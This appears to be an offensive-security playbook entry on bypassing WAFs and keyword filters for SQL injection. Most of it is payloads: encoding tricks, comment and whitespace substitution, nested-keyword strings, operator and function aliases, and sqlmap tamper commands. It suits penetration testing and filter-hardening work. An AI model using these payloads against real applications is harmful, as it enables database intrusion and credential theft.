# SQL Injection — WAF / Filter Bypass

## When this applies

- Direct SQLi payloads return 403/blocked or trip ModSecurity / CloudFlare / Imperva / native blacklists.
- Application has its own keyword blocklist (e.g. PHP `str_replace`, regex filter on `union|select`).
- You need to deliver a working payload past signature-based detection.

## Technique

Mutate the payload's surface form while preserving its execution semantics. Each WAF/filter has different normalization weaknesses; the goal is to find encoding/representation that the target's parser accepts but the WAF's rule engine doesn't recognize.

## Steps

### 1. Case variation

```sql
SeLeCt * FrOm users
UnIoN SeLeCt username,password FrOm users
```

Defeats case-sensitive regex. Most modern WAFs case-fold, so this alone rarely suffices.

### 2. Comment insertion (inline)

```sql
SE/**/LECT * FR/**/OM users
UN/**/ION SE/**/LECT username,password FR/**/OM users
```

`/**/` is treated as whitespace by SQL parsers but the regex `\bunion\b` won't match `un/**/ion`.

### 3. Whitespace alternatives

Replace literal spaces with any whitespace character, including encoded variants:

```
SELECT+*+FROM+users           (URL-encoded space)
SELECT%09*%09FROM%09users     (tab)
SELECT%0a*%0aFROM%0ausers     (newline)
SELECT/**/*+FROM+users        (empty comment)
```

### 4. URL encoding (single + double)

```
%53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20users
%2553%2545%254C%2545%2543%2554%2520%252A%2520%2546%2552%254F%254D%2520users    (double encoding)
```

Double encoding works when the WAF decodes once but the application decodes twice.

### 5. Hex encoding

```sql
0x53454C454354202A2046524F4D2075736572      -- 'SELECT * FROM user'
SELECT * FROM users WHERE name=0x61646d696e -- 'admin'
```

Useful inside `WHERE column=...` to avoid quotes.

### 6. XML entity encoding (when input is XML body)

```xml
<storeId><@hex_entities>1 UNION SELECT username FROM users</@hex_entities></storeId>
```

Becomes:
```
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;...
```

The XML parser decodes entities AFTER the WAF inspects the raw request — SQL keywords are reconstructed only on the application server.

Burp's Hackvertor extension wraps highlighted text with `<@hex_entities>...</@hex_entities>` automatically.

### 7. Keyword nesting bypass

When the filter does NON-RECURSIVE `str_replace(['union','select'], '', input)`:

```
SESELECTLECT  →  (replace removes 'SELECT' from middle)  →  SELECT
UNUNIONION    →  UNION
OorR          →  (replace removes 'or')                  →  OR
```

Example payload: POST a JSON body field with `"' OorR '1'='1' --"`. The `or` inside `OorR` is consumed by the filter pass, leaving `OR`.

This same nesting pattern applies to path traversal (`....//`, `..././`) — see `server-side/scenarios/path-traversal/`.

### 8. Blind regex bypass with `/**/` and `&&`

When the filter regex blocks spaces (`\s`) and SQL keywords (`and|or|union|substring`):

```
admin"/**/&&/**/mid(password,1,1)="a"#
```

- `/**/` survives space-removal regex.
- `&&` survives `and`-keyword regex (alias of `AND` in MySQL).
- `mid()` survives `substring|substr` regex (functional alias).
- `#` is MySQL comment.

### 9. Logical operator aliases

```sql
&&    instead of AND   (MySQL)
||    instead of OR    (MySQL with PIPES_AS_CONCAT off; PostgreSQL)
NOT   instead of !=
XOR   instead of != for booleans (MySQL)
```

### 10. Function aliases

```sql
MID()    instead of SUBSTRING()    (MySQL)
LPAD()   instead of LEFT()         (most DBMS)
ASCII()  + ORD()                   (character lookup)
```

### 11. Tampers in sqlmap

```bash
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between
sqlmap -u "..." --tamper=charunicodeencode,space2plus,randomcase
```

Common tamper scripts: `space2comment`, `between`, `randomcase`, `charunicodeencode`, `apostrophenullencode`, `equaltolike`.

## Verifying success

- Original payload returns 403 (WAF block).
- Mutated payload returns 200 with the expected SQLi behavior.
- Application logs (if accessible) show the SQL query executed at the database — confirms the payload was decoded server-side.

## Common pitfalls

- WAFs increasingly use libinjection (semantic parser) instead of regex — encoding tricks don't fool it. Need to mutate query SHAPE, not just surface bytes.
- Some application frameworks normalize input BEFORE the SQL layer (e.g. trim, html_entity_decode) — your encoding may be canonicalized away before the SQL is built.
- Double-encoding only helps if you can identify a layer that decodes again; otherwise the application sees `%2553` as literal text.
- Comments (`/**/`) are not "whitespace" for ALL DBMS — Oracle treats them as token separators only in specific contexts.
- Hackvertor tags (`<@hex_entities>`) only work inside XML/HTML bodies; they're literal text in URL params.

## Tools

- Burp Suite Hackvertor extension (one-click encoding).
- sqlmap `--tamper=...` for automated mutation.
- ModSecurity rule debugging via `tx.anomaly_score` headers in test environments.
- Reading the WAF vendor's documentation — most publish their exact regex set.
